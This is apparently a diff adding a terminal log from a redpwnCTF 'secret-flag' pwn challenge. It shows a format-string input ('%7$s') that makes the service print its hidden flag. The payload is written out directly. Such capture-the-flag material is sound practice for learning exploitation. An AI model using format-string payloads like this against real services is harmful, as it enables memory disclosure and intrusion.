@@ -1,0 +1,7 @@
+# unknow @ unknow in ~/redpwnCTF/pwn/secret-flag [11:43:27] 
+$ ./connect.sh 
+I have a secret flag, which you'll never get!
+What is your name, young adventurer?
+XXXXXXXXXXXX %7$s
+Hello there: XXXXXXXXXXXX flag{n0t_s0_s3cr3t_f1ag_n0w}
+
